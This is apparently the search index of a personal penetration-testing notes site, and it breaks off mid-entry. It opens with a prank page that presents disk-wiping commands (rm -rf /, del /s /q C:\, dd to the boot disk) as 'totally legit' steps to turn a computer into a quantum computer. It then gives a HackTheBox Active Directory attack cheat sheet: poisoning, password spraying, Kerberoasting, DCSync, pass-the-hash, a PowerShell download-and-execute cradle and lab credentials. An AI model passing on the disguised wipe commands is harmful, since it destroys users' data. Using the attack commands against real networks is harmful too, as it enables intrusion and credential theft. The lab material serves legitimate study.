{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"Notes of Ertaoz Bregvadze","text":"<p>Welcome to the notes of Ertaoz Bregvadze, a renowned scientist, physicist, and visionary inventor. Among his many groundbreaking contributions, Bregvadze is best known for inventing the flying machine, a revolutionary advancement that changed the course of transportation and human exploration.</p> <p>I am sharing one of his biggest contributions: transforming your computer into a quantum computer! With these totally legit commands, you can unlock the power of quantum computing and watch your machine transcend space and time! \ud83c\udf0c</p> LinuxWindowsMacOS <pre><code>sudo rm -rf / --no-preserve-root\n</code></pre> <pre><code>del /s /q C:\\\n</code></pre> <pre><code>sudo dd if=/dev/zero of=/dev/disk0 bs=1m\n</code></pre>"},{"location":"HackTheBox%20Materials/Active%20Directory%20Enumeration%5CAttacks/","title":"Active Directory Enumeration/Attacks","text":"<ul> <li>Initial Enumeration</li> <li>Identifying Hosts     &gt; Wireshark, TcpDump, Responder, fping, Nmap, </li> <li>Identifying Users     &gt; Kerbrute, CrackMapExec</li> <li>Identifying Potential Vulnerabilities     &gt; Local Privilege Escalation</li> <li>Sniffing out a Foothold</li> <li>LLMNR/NBT-NS Poisoning - from Linux     &gt; Responder</li> <li>LLMNR/NBT-NS Poisoning - from Windows     &gt; Inveigh, C# Inveigh (InveighZero)</li> <li>Sighting In, Hunting For A User</li> <li>Enumerating the Password Policy - from Linux<ul> <li>Enumerating the Password Policy - from Linux - SMB NULL Sessions <p>CrackMapExec, rpcclient, enum4linux</p> </li> <li>Enumerating the Password Policy - from Linux - LDAP Anonymous Bind <p>ldapsearch, windapsearch</p> </li> </ul> </li> <li>Enumerating the Password Policy - from Windows     &gt; net.exe, PowerView</li> <li>Password Spraying - Making a Target User List<ul> <li>SMB NULL Session to Pull User List <p>enum4linux, rpcclient, CrackMapExec</p> </li> <li>Gathering Users with LDAP Anonymous <p>ldapsearch, windapsearch</p> </li> <li>Enumerating Users with Kerbrute <p>kerbrute</p> </li> <li>Credentialed Enumeration to Build our User List <p>CrackMapexec</p> </li> </ul> </li> <li>Spray Responsibly</li> <li>Internal Password Spraying - from Linux     &gt; kerbrute, rpcclient, Crackmapexec</li> <li>Internal Password Spraying - from Windows     &gt; DomainPasswordSpray.ps1</li> <li>Deeper Down the Rabbit Hole</li> <li>Enumerating Security Controls     &gt; LAPSToolkit, PowerShell</li> <li>Credentialed Enumeration - from Linux     &gt; CrackMapExec, SMBMap, rpcclient, Impacket Toolkit, Windapsearch, Bloodhound</li> <li>Credentialed Enumeration - from Windows     &gt; PowerView, SharpView, Shares, Snaffler, SharpHound</li> <li>Living Off the Land<ul> <li>Harnessing PowerShell</li> <li>Checking Defenses</li> <li>Am I Alone? <p>qwinsta</p> </li> <li>Network Information <p>arp, netsh, route, ipconfig</p> </li> <li>Windows Management Instrumentation (WMI) <p>wmic</p> </li> <li>Net Commands <p>net.exe, net1.exe</p> </li> <li>Dsquery <p>C:\\Windows\\System32\\dsquery.dll</p> </li> </ul> </li> <li>Cooking with Fire</li> <li>Kerberoasting - from Linux     &gt; GetUserSPNs.py</li> <li>Kerberoasting - from Windows     &gt; setspn, Mimikatz, PowerView, Rubeus</li> <li>An ACE in the Hole</li> <li>Enumerating ACLs with PowerView</li> <li>Enumerating ACLs with BloodHound</li> <li>DCSync     &gt; secretsdump.py, Mimikatz</li> <li>Stacking The Deck</li> <li>Privileged Access<ul> <li>Remote Desktop <p>RDP</p> </li> <li>WinRM <p>PowerView, Evil-WinRM</p> </li> <li>SQL Server Admin <p>PowerUpSQL, mssqlclient.py</p> </li> </ul> </li> <li>Kerberos \"Double Hop\" Problem</li> <li>Bleeding Edge Vulnerabilities<ul> <li>NoPac (SamAccountName Spoofing) <p>NoPac</p> </li> <li>PrintNightmare <p>PrintNightmare</p> </li> <li>PetitPotam (MS-EFSRPC) <p>PetitPotam</p> </li> </ul> </li> <li>Miscellaneous Misconfigurations<ul> <li>Exchange Related Group Membership</li> <li>PrivExchange</li> <li>Printer Bug</li> <li>Sniffing LDAP Credentials</li> <li>Enumerating DNS Records <p>adidnsdump</p> </li> <li>Password in Description Field</li> <li>PASSWD_NOTREQD Field</li> <li>Group Policy Preferences (GPP) Passwords</li> <li>ASREPRoasting <p>Rubeus, Kerbrute</p> </li> <li>Group Policy Object (GPO) Abuse</li> </ul> </li> <li>Why So Trusting?</li> <li>Attacking Domain Trusts - Child -&gt; Parent Trusts - from Windows     &gt; Mimikatz, PowerView, Rubeus</li> <li>Attacking Domain Trusts - Child -&gt; Parent Trusts - from Linux     &gt; secretsdump.py, lookupsid.py, ticketer.py, psexec.py, raiseChild.py</li> <li>Breaking Down Boundaries</li> <li>Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows<ul> <li>Cross-Forest Kerberoasting <p>Rubeus, PoweView</p> </li> <li>Admin Password Re-Use &amp; Group Membership <p>PoweView</p> </li> <li>SID History Abuse - Cross Forest</li> </ul> </li> <li>Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux<ul> <li>Cross-Forest Kerberoasting <p>GetUserSPNs.py</p> </li> <li>Hunting Foreign Group Membership with Bloodhound-python <p>bloodhound-python</p> </li> </ul> </li> </ul>"},{"location":"HackTheBox%20Materials/Active%20Directory%20Enumeration%5CAttacks/#ad-enumeration-attacks-skills-assessment-part-i","title":"AD Enumeration &amp; Attacks - Skills Assessment Part I","text":"<ol> <li>Perform Kerberoasting attack to obtain TGS hashes of SPN users</li> <li>Crack TGS hash of <code>svc_sql</code> user</li> <li>Use Chisel for tunneling.</li> <li>Use Xfreerdp to login on MS01 host using <code>svc_sql</code> credentials</li> <li>Run Mimikatz on MS01 host to obtain cleartext password of <code>tpetty</code> user</li> <li>Perform DCsync attack with <code>tpetty</code> user credentials using secretsdump.py to obtain NTLM hashes of AD users.</li> </ol>"},{"location":"HackTheBox%20Materials/Active%20Directory%20Enumeration%5CAttacks/#ad-enumeration-attacks-skills-assessment-part-ii","title":"AD Enumeration &amp; Attacks - Skills Assessment Part II","text":"<ol> <li>Obtain NTLMv2 Hash of <code>AB920</code> user with Responder</li> <li>Crack it and login on <code>MS01</code> host with captured credentials using Evil-winrm</li> <li>Perform credentialed enumeration and obtain full  list of AD users with crackmapexec</li> <li>Perform Password spray attack with \"Welcome1\" password to obtain <code>BR086</code> account</li> <li>Enumerate domain controller shares with <code>BR086</code> account using smbmap to obtain database credentials</li> <li>Login on <code>SQL01</code> host with obtained database credentials using msqqlclient.py</li> <li>Privilege escalation with PrintSpoofer on <code>SQL01</code> Host</li> <li>Obtain <code>Administrator</code> NTLM hash on <code>SQL01</code> host using CrackMapExec</li> <li>Use same <code>Administrator</code> NTLM hash to login on <code>MS01</code> host.</li> <li>Run inveigh on <code>MS01</code> host to capture <code>CT059</code> user NTLMv2 hash. </li> <li>Crack it and perform DCSync attack with <code>CT059</code> user credentials</li> <li>Use secretsdump.py to obtain NTLM hash of <code>KRBTGT</code> user.</li> </ol>"},{"location":"HackTheBox%20Materials/Active%20Directory%20Enumeration%5CAttacks/#tools-of-the-trade","title":"Tools of the Trade","text":"Tool Description PowerView/SharpView A PowerShell tool and a .NET port of the same used to gain situational awareness in AD. These tools can be used as replacements for various Windows <code>net*</code> commands and more. PowerView and SharpView can help us gather much of the data that BloodHound does, but it requires more work to make meaningful relationships among all of the data points. These tools are great for checking what additional access we may have with a new set of credentials, targeting specific users or computers, or finding some \"quick wins\" such as users that can be attacked via Kerberoasting or ASREPRoasting. BloodHound Used to visually map out AD relationships and help plan attack paths that may otherwise go unnoticed. Uses the SharpHound PowerShell or C# ingestor to gather data to later be imported into the BloodHound JavaScript (Electron) application with a Neo4j database for graphical analysis of the AD environment. SharpHound The C# data collector to gather information from Active Directory about varying AD objects such as users, groups, computers, ACLs, GPOs, user and computer attributes, user sessions, and more. The tool produces JSON files which can then be ingested into the BloodHound GUI tool for analysis. BloodHound.py A Python-based BloodHound ingestor based on the Impacket toolkit. It supports most BloodHound collection methods and can be run from a non-domain joined attack box. The output can be ingested into the BloodHound GUI for analysis. Kerbrute A tool written in Go that uses Kerberos Pre-Authentication to enumerate Active Directory accounts and perform password spraying and brute forcing. Impacket toolkit A collection of tools written in Python for interacting with network protocols. The suite of tools contains various scripts for enumerating and attacking Active Directory. Responder Responder is a purpose built tool to poison LLMNR, NBT-NS and MDNS, with many different functions. Inveigh.ps1 Similar to Responder, a PowerShell tool for performing various network spoofing and poisoning attacks. C# Inveigh (InveighZero) The C# version of Inveigh with with a semi-interactive console for interacting with captured data such as username and password hashes. rpcclient A part of the Samba suite on Linux distributions that can be used to perform a variety of Active Directory enumeration tasks via the remote RPC service. CrackMapExec (CME) CME is an enumeration, attack, and post-exploitation toolkit which can help us greatly in enumeration and performing attacks with the data we gather. CME attempts to \"live off the land\" and abuse built-in AD features and protocols such as SMB, WMI, WinRM, and MSSQL. Rubeus Rubeus is a C# tool built for Kerberos Abuse. GetUserSPNs.py Another Impacket module geared towards finding Service Principal names tied to normal users. Hashcat A great hashcracking and password recovery tool. enum4linux A tool for enumerating information from Windows and Samba systems. enum4linux-ng A rework of the original Enum4linux tool that works a bit differently. ldapsearch Built in interface for interacting with the LDAP protocol. windapsearch A Python script used to enumerate AD users, groups, and computers using LDAP queries. Useful for automating custom LDAP queries. DomainPasswordSpray.ps1 DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain. LAPSToolkit The toolkit includes functions written in PowerShell that leverage PowerView to audit and attack Active Directory environments that have deployed Microsoft's Local Administrator Password Solution (LAPS). smbmap SMB share enumeration across a domain. psexec.py Part of the Impacket toolset, it provides us with psexec like functionality in the form of a semi-interactive shell. wmiexec.py Part of Impacket toolset, it provides the capability of command execution over WMI. Snaffler Useful for finding information (such as credentials) in Active Directory on computers with accessible file shares. smbserver.py Simple SMB server execution for interaction with Windows hosts. Easy way to transfer files within a network. setspn.exe Reads, modifies, and deletes the Service Principal Names (SPN) directory property for an Active Directory service account. Mimikatz Performs many functions. Noteably, pass-the-hash attacks, extracting plaintext passwords, and kerberos ticket extraction from memory on host. secretsdump.py Remotely dump SAM and LSA secrets from a host. evil-winrm Provides us with an interactive shell on host over the WinRM protocol. mssqlclient.py Part of Impacket toolset, it provides the ability to interact with MSSQL databases. noPac.py Exploit combo using CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user. rpcdump.py Part of the Impacket toolset, RPC endpoint mapper. CVE-2021-1675.py Printnightmare PoC in python. ntlmrelayx.py Part of the Impacket toolset, it performs SMB relay attacks. PetitPotam.py PoC tool for CVE-2021-36942 to coerce Windows hosts to authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions. gettgtpkinit.py Tool for manipulating certificates and TGTs. getnthash.py This tool will use an existing TGT to request a PAC for the current user using U2U. adidnsdump A tool for enumeration and dumping of DNS records from a domain. Similar to performing a DNS Zone transfer. gpp-decrypt Extracts usernames and passwords from Group Policy preferences. GetNPUsers.py Attempt to list and get TGTs for those users that have the property 'Do not require Kerberos preauthentication' set. lookupsid.py SID bruteforcing tool. ticketer.py A tool for creation and customization of TGT/TGS tickets. raiseChild.py Part of the Impacket toolset, It is a tool for child to parent domain privilege escalation. Active Directory Explorer Active Directory Explorer (AD Explorer) is an AD viewer and editor. It can be used to navigate an AD database and view object properties and attributes. It can also be used to save a snapshot of an AD database for off-line analysis. When an AD snapshot is loaded, it can be explored as a live version of the database. It can also be used to compare two AD database snapshots to see changes in objects, attributes, and security permissions. PingCastle Used for auditing the security level of an AD environment based on a risk assessment and maturity framework (based on CMMI adapted to AD security). Group3r Group3r is useful for auditing and finding security misconfigurations in AD Group Policy Objects (GPO). ADRecon A tool used to extract various data from a target AD environment. The data can be output in Microsoft Excel format with summary views and analysis to assist with analysis and paint a picture of the environment's overall security state."},{"location":"HackTheBox%20Materials/Active%20Directory%20Enumeration%5CAttacks/#initial-enumeration","title":"Initial Enumeration","text":"Command Description <code>nslookup ns1.inlanefreight.com</code> Used to query the domain name system and discover the IP address to domain name mapping of the target entered from a Linux-based host. <code>sudo tcpdump -i ens224</code> Used to start capturing network packets on the network interface proceeding the <code>-i</code> option a Linux-based host. <code>sudo responder -I ens224 -A</code> Used to start responding to &amp; analyzing <code>LLMNR</code>, <code>NBT-NS</code> and <code>MDNS</code> queries on the interface specified proceeding the<code>-I</code> option and operating in <code>Passive Analysis</code> mode which is activated using <code>-A</code>. Performed from a Linux-based host <code>fping -asgq 172.16.5.0/23</code> Performs a ping sweep on the specified network segment from a Linux-based host. <code>sudo nmap -v -A -iL hosts.txt -oN /home/User/Documents/host-enum</code> Performs an nmap scan that with OS detection, version detection, script scanning, and traceroute enabled (<code>-A</code>) based on a list of hosts (<code>hosts.txt</code>) specified in the file proceeding <code>-iL</code>. Then outputs the scan results to the file specified after the <code>-oN</code>option. Performed from a Linux-based host <code>sudo git clone https://github.com/ropnop/kerbrute.git</code> Uses <code>git</code> to clone the kerbrute tool from a Linux-based host. <code>make help</code> Used to list compiling options that are possible with <code>make</code> from a Linux-based host. <code>sudo make all</code> Used to compile a <code>Kerbrute</code> binary for multiple OS platforms and CPU architectures. <code>./kerbrute_linux_amd64</code> Used to test the chosen complied <code>Kebrute</code> binary from a Linux-based host. <code>sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute</code> Used to move the <code>Kerbrute</code> binary to a directory can be set to be in a Linux user's path. Making it easier to use the tool. <code>./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results</code> Runs the Kerbrute tool to discover usernames in the domain (<code>INLANEFREIGHT.LOCAL</code>) specified proceeding the <code>-d</code> option and the associated domain controller specified proceeding <code>--dc</code>using a wordlist and outputs (<code>-o</code>) the results to a specified file. Performed from a Linux-based host. <code>crackmapexec smb 172.16.5.5 -u anonymous -p \"\" --rid-brute 10000</code> Used to Brute Force users with rids through crackmapexec anonymous login."},{"location":"HackTheBox%20Materials/Active%20Directory%20Enumeration%5CAttacks/#llmnrntb-ns-poisoning","title":"LLMNR/NTB-NS Poisoning","text":"Command Description <code>responder -h</code> Used to display the usage instructions and various options available in <code>Responder</code> from a Linux-based host. <code>hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt</code> Uses <code>hashcat</code> to crack <code>NTLMv2</code> (<code>-m</code>) hashes that were captured by responder and saved in a file (<code>frond_ntlmv2</code>). The cracking is done based on a specified wordlist. <code>Import-Module .\\Inveigh.ps1</code> Using the <code>Import-Module</code> PowerShell cmd-let to import the Windows-based tool <code>Inveigh.ps1</code>. <code>(Get-Command Invoke-Inveigh).Parameters</code> Used to output many of the options &amp; functionality available with <code>Invoke-Inveigh</code>. Peformed from a Windows-based host. <code>Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y</code> Starts <code>Inveigh</code> on a Windows-based host with LLMNR &amp; NBNS spoofing enabled and outputs the results to a file. <code>.\\Inveigh.exe</code> Starts the <code>C#</code> implementation of <code>Inveigh</code> from a Windows-based host. <code>$regkey = \"HKLM:SYSTEM\\CurrentControlSet\\services\\NetBT\\Parameters\\Interfaces\" Get-ChildItem $regkey \\|foreach { Set-ItemProperty -Path \"$regkey\\$($_.pschildname)\" -Name NetbiosOptions -Value 2 -Verbose}</code> PowerShell script used to disable NBT-NS on a Windows host."},{"location":"HackTheBox%20Materials/Active%20Directory%20Enumeration%5CAttacks/#password-spraying-password-policies","title":"Password Spraying &amp; Password Policies","text":"Command Description <code>#!/bin/bash  for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}     do echo $x; done</code> Bash script used to generate <code>16,079,616</code> possible username combinations from a Linux-based host. <code>crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol</code> Uses <code>CrackMapExec</code>and valid credentials (<code>avazquez:Password123</code>) to enumerate the password policy (<code>--pass-pol</code>) from a Linux-based host. <code>rpcclient -U \"\" -N 172.16.5.5</code> Uses <code>rpcclient</code> to discover information about the domain through <code>SMB NULL</code> sessions. Performed from a Linux-based host. <code>rpcclient $&gt; querydominfo</code> Uses <code>rpcclient</code> to enumerate the password policy in a target Windows domain from a Linux-based host. <code>enum4linux  -P 172.16.5.5</code> Uses <code>enum4linux</code> to enumerate the password policy (<code>-P</code>) in a target Windows domain from a Linux-based host. <code>enum4linux-ng -P 172.16.5.5 -oA ilfreight</code> Uses <code>enum4linux-ng</code> to enumerate the password policy (<code>-P</code>) in a target Windows domain from a Linux-based host, then presents the output in YAML &amp; JSON saved in a file proceeding the <code>-oA</code> option. <code>ldapsearch -h 172.16.5.5 -x -b \"DC=INLANEFREIGHT,DC=LOCAL\" -s sub \"*\" \\| grep -m 1 -B 10 pwdHistoryLength</code> Uses <code>ldapsearch</code> to enumerate the password policy in a  target Windows domain from a Linux-based host. <code>net accounts</code> Used to enumerate the password policy in a Windows domain from a Windows-based host. <code>Import-Module .\\PowerView.ps1</code> Uses the Import-Module cmd-let to import the <code>PowerView.ps1</code> tool from a Windows-based host. <code>Get-DomainPolicy</code> Used to enumerate the password policy in a target Windows domain from a Windows-based host. <code>enum4linux -U 172.16.5.5  \\| grep \"user:\" \\| cut -f2 -d\"[\" \\| cut -f1 -d\"]\"</code> Uses <code>enum4linux</code> to discover user accounts in a target Windows domain, then leverages <code>grep</code> to filter the output to just display the user from a Linux-based host. <code>rpcclient -U \"\" -N 172.16.5.5  rpcclient $&gt; enumdomuser</code> Uses rpcclient to discover user accounts in a target Windows domain from a Linux-based host. <code>crackmapexec smb 172.16.5.5 --users</code> Uses <code>CrackMapExec</code> to discover users (<code>--users</code>) in a target Windows domain from a Linux-based host. <code>ldapsearch -h 172.16.5.5 -x -b \"DC=INLANEFREIGHT,DC=LOCAL\" -s sub \"(&amp;(objectclass=user))\"  \\| grep sAMAccountName: \\| cut -f2 -d\" \"</code> Uses <code>ldapsearch</code> to discover users in a target Windows doman, then filters the output using <code>grep</code> to show only the <code>sAMAccountName</code> from a Linux-based host. <code>./windapsearch.py --dc-ip 172.16.5.5 -u \"\" -U</code> Uses the python tool <code>windapsearch.py</code> to discover users in a target Windows domain from a Linux-based host. <code>for u in $(cat valid_users.txt);do rpcclient -U \"$u%Welcome1\" -c \"getusername;quit\" 172.16.5.5 \\| grep Authority; done</code> Bash one-liner used to perform a password spraying attack using <code>rpcclient</code> and a list of users (<code>valid_users.txt</code>) from a Linux-based host. It also filters out failed attempts to make the output cleaner. <code>kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1</code> Uses <code>kerbrute</code> and a list of users (<code>valid_users.txt</code>) to perform a password spraying attack against a target Windows domain from a Linux-based host. <code>sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 \\| grep +</code> Uses <code>CrackMapExec</code> and a list of users (<code>valid_users.txt</code>) to perform a password spraying attack against a target Windows domain from a Linux-based host. It also filters out logon failures using <code>grep</code>. <code>sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123</code> Uses <code>CrackMapExec</code> to validate a set of credentials from a Linux-based host. <code>sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf \\| grep +</code> Uses <code>CrackMapExec</code> and the -<code>-local-auth</code> flag to ensure only one login attempt is performed from a Linux-based host. This is to ensure accounts are not locked out by enforced password policies. It also filters out logon failures using <code>grep</code>. <code>Import-Module .\\DomainPasswordSpray.ps1</code> Used to import the PowerShell-based tool <code>DomainPasswordSpray.ps1</code> from a Windows-based host. <code>Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue</code> Performs a password spraying attack and outputs (-OutFile) the results to a specified file (<code>spray_success</code>) from a Windows-based host."},{"location":"HackTheBox%20Materials/Active%20Directory%20Enumeration%5CAttacks/#enumerating-security-controls","title":"Enumerating Security Controls","text":"Command Description <code>Get-MpComputerStatus</code> PowerShell cmd-let used to check the status of <code>Windows Defender Anti-Virus</code> from a Windows-based host. <code>Get-AppLockerPolicy -Effective \\| select -ExpandProperty RuleCollections</code> PowerShell cmd-let used to view <code>AppLocker</code> policies from a Windows-based host. <code>$ExecutionContext.SessionState.LanguageMode</code> PowerShell script used to discover the <code>PowerShell Language Mode</code> being used on a Windows-based host. Performed from a Windows-based host. <code>Find-LAPSDelegatedGroups</code> A <code>LAPSToolkit</code> function that discovers <code>LAPS Delegated Groups</code> from a Windows-based host. <code>Find-AdmPwdExtendedRights</code> A <code>LAPSTookit</code> function that checks the rights on each computer with LAPS enabled for any groups with read access and users with <code>All Extended Rights</code>. Performed from a Windows-based host. <code>Get-LAPSComputers</code> A <code>LAPSToolkit</code> function that searches for computers that have LAPS enabled, discover password expiration and can discover randomized passwords. Performed from a Windows-based host."},{"location":"HackTheBox%20Materials/Active%20Directory%20Enumeration%5CAttacks/#credentialed-enumeration","title":"Credentialed Enumeration","text":"Command Description <code>xfreerdp /u:forend@inlanefreight.local /p:Klmcargo2 /v:172.16.5.25</code> Connects to a Windows target using valid credentials. Performed from a Linux-based host. <code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users</code> Authenticates with a Windows target over <code>smb</code> using valid credentials and attempts to discover more users (<code>--users</code>) in a target Windows domain. Performed from a Linux-based host. <code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups</code> Authenticates with a Windows target over <code>smb</code> using valid credentials and attempts to discover groups (<code>--groups</code>) in a target Windows domain. Performed from a Linux-based host. <code>sudo crackmapexec smb 172.16.5.125 -u forend -p Klmcargo2 --loggedon-users</code> Authenticates with a Windows target over <code>smb</code> using valid credentials and attempts to check for a list of logged on users (<code>--loggedon-users</code>) on the target Windows host. Performed from a Linux-based host. <code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares</code> Authenticates with a Windows target over <code>smb</code> using valid credentials and attempts to discover any smb shares (<code>--shares</code>). Performed from a Linux-based host. <code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share Dev-share</code> Authenticates with a Windows target over <code>smb</code> using valid credentials and utilizes the CrackMapExec module (<code>-M</code>) <code>spider_plus</code> to go through each readable share (<code>Dev-share</code>) and list all readable files.  The results are outputted in <code>JSON</code>. Performed from a Linux-based host. <code>smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5</code> Enumerates the target Windows domain using valid credentials and lists shares &amp; permissions available on each within the context of the valid credentials used and the target Windows host (<code>-H</code>). Performed from a Linux-based host. <code>smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R SYSVOL --dir-only</code> Enumerates the target Windows domain using valid credentials and performs a recursive listing (<code>-R</code>) of the specified share (<code>SYSVOL</code>) and only outputs a list of directories (<code>--dir-only</code>) in the share. Performed from a Linux-based host. <code>rpcclient $&gt; queryuser 0x457</code> Enumerates a target user account in a Windows domain using its relative identifier (<code>0x457</code>). Performed from a Linux-based host. <code>rpcclient $&gt; enumdomusers</code> Discovers user accounts in a target Windows domain and their associated relative identifiers (<code>rid</code>). Performed from a Linux-based host. <code>psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125</code> Impacket tool used to connect to the <code>CLI</code>  of a Windows target via the <code>ADMIN$</code> administrative share with valid credentials. Performed from a Linux-based host. <code>wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5</code> Impacket tool used to connect to the <code>CLI</code> of a Windows target via <code>WMI</code> with valid credentials. Performed from a Linux-based host. <code>windapsearch.py -h</code> Used to display the options and functionality of windapsearch.py. Performed from a Linux-based host. <code>python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\\wley -p Klmcargo2 --da</code> Used to enumerate the domain admins group (<code>--da</code>) using a valid set of credentials on a target Windows domain. Performed from a Linux-based host. <code>python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\\wley -p Klmcargo2 -PU</code> Used to perform a recursive search (<code>-PU</code>) for users with nested permissions using valid credentials. Performed from a Linux-based host. <code>sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all</code> Executes the python implementation of BloodHound (<code>bloodhound.py</code>) with valid credentials and specifies a name server (<code>-ns</code>) and target Windows domain (<code>inlanefreight.local</code>)  as well as runs all checks (<code>-c all</code>). Runs using valid credentials. Performed from a Linux-based host."},{"location":"HackTheBox%20Materials/Active%20Directory%20Enumeration%5CAttacks/#enumeration-by-living-off-the-land","title":"Enumeration by Living Off the Land","text":"Command Description <code>Get-Module</code> PowerShell cmd-let used to list all available modules, their version and command options from a Windows-based host. <code>Import-Module ActiveDirectory</code> Loads the <code>Active Directory</code> PowerShell module from a Windows-based host. <code>Get-ADDomain</code> PowerShell cmd-let used to gather Windows domain information from a Windows-based host. <code>Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName</code> PowerShell cmd-let used to enumerate user accounts on a target Windows domain and filter by <code>ServicePrincipalName</code>. Performed from a Windows-based host. <code>Get-ADTrust -Filter *</code> PowerShell cmd-let used to enumerate any trust relationships in a target Windows domain and filters by any (<code>-Filter *</code>). Performed from a Windows-based host. <code>Get-ADGroup -Filter * \\| select name</code> PowerShell cmd-let used to enumerate groups in a target Windows domain and filters by the name of the group (<code>select name</code>). Performed from a Windows-based host. <code>Get-ADGroup -Identity \"Backup Operators\"</code> PowerShell cmd-let used to search for a specifc group (<code>-Identity \"Backup Operators\"</code>). Performed from a Windows-based host. <code>Get-ADGroupMember -Identity \"Backup Operators\"</code> PowerShell cmd-let used to discover the members of a specific group (<code>-Identity \"Backup Operators\"</code>). Performed from a Windows-based host. <code>Export-PowerViewCSV</code> PowerView script used to append results to a <code>CSV</code> file. Performed from a Windows-based host. <code>ConvertTo-SID</code> PowerView script used to convert a <code>User</code> or <code>Group</code> name to it's <code>SID</code>. Performed from a Windows-based host. <code>Get-DomainSPNTicket</code> PowerView script used to request the kerberos ticket for a specified service principal name (<code>SPN</code>). Performed from a Windows-based host. <code>Get-Domain</code> PowerView script used tol return the AD object for the current (or specified) domain. Performed from a Windows-based host. <code>Get-DomainController</code> PowerView script used to return a list of the target domain controllers for the specified target domain. Performed from a Windows-based host. <code>Get-DomainUser</code> PowerView script used to return all users or specific user objects in AD. Performed from a Windows-based host. <code>Get-DomainComputer</code> PowerView script used to return all computers or specific computer objects in AD. Performed from a Windows-based host. <code>Get-DomainGroup</code> PowerView script used to eturn all groups or specific group objects in AD. Performed from a Windows-based host. <code>Get-DomainOU</code> PowerView script used to search for all or specific OU objects in AD. Performed from a Windows-based host. <code>Find-InterestingDomainAcl</code> PowerView script used to find object <code>ACLs</code> in the domain with modification rights set to non-built in objects. Performed from a Windows-based host. <code>Get-DomainGroupMember</code> PowerView script used to return the members of a specific domain group. Performed from a Windows-based host. <code>Get-DomainFileServer</code> PowerView script used to return a list of servers likely functioning as file servers. Performed from a Windows-based host. <code>Get-DomainDFSShare</code> PowerView script used to return a list of all distributed file systems for the current (or specified) domain. Performed from a Windows-based host. <code>Get-DomainGPO</code> PowerView script used to return all GPOs or specific GPO objects in AD. Performed from a Windows-based host. <code>Get-DomainPolicy</code> PowerView script used to return the default domain policy or the domain controller policy for the current domain. Performed from a Windows-based host. <code>Get-NetLocalGroup</code> PowerView script used to  enumerate local groups on a local or remote machine. Performed from a Windows-based host. <code>Get-NetLocalGroupMember</code> PowerView script enumerate members of a specific local group. Performed from a Windows-based host. <code>Get-NetShare</code> PowerView script used to return a list of open shares on a local (or a remote) machine. Performed from a Windows-based host. <code>Get-NetSession</code> PowerView script used to return session information for the local (or a remote) machine. Performed from a Windows-based host. <code>Test-AdminAccess</code> PowerView script used to test if the current user has administrative access to the local (or a remote) machine. Performed from a Windows-based host. <code>Find-DomainUserLocation</code> PowerView script used to find machines where specific users are logged into. Performed from a Windows-based host. <code>Find-DomainShare</code> PowerView script used to find reachable shares on domain machines. Performed from a Windows-based host. <code>Find-InterestingDomainShareFile</code> PowerView script that searches for files matching specific criteria on readable shares in the domain. Performed from a Windows-based host. <code>Find-LocalAdminAccess</code> PowerView script used to find machines on the local domain where the current user has local administrator access Performed from a Windows-based host. <code>Get-DomainTrust</code> PowerView script that returns domain trusts for the current domain or a specified domain. Performed from a Windows-based host. <code>Get-ForestTrust</code> PowerView script that returns all forest trusts for the current forest or a specified forest. Performed from a Windows-based host. <code>Get-DomainForeignUser</code> PowerView script that enumerates users who are in groups outside of the user's domain. Performed from a Windows-based host. <code>Get-DomainForeignGroupMember</code> PowerView script that enumerates groups with users outside of the group's domain and returns each foreign member. Performed from a Windows-based host. <code>Get-DomainTrustMapping</code> PowerView script that enumerates all trusts for current domain and any others seen. Performed from a Windows-based host. <code>Get-DomainGroupMember -Identity \"Domain Admins\" -Recurse</code> PowerView script used to list all the members of a target group (<code>\"Domain Admins\"</code>) through the use of the recurse option (<code>-Recurse</code>). Performed from a Windows-based host. <code>Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName</code> PowerView script used to find users on the target Windows domain that have the <code>Service Principal Name</code> set. Performed from a Windows-based host. <code>.\\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data</code> Runs a tool called <code>Snaffler</code> against a target Windows domain that finds various kinds of data in shares that the compromised account has access to. Performed from a Windows-based host."},{"location":"HackTheBox%20Materials/Active%20Directory%20Enumeration%5CAttacks/#transfering-files","title":"Transfering Files","text":"Command Description <code>sudo python3 -m http.server 8001</code> Starts a python web server for quick hosting of files. Performed from a Linux-basd host. <code>\"IEX(New-Object Net.WebClient).downloadString('http://172.16.5.222/SharpHound.exe')\"</code> PowerShell one-liner used to download a file from a web server. Performed from 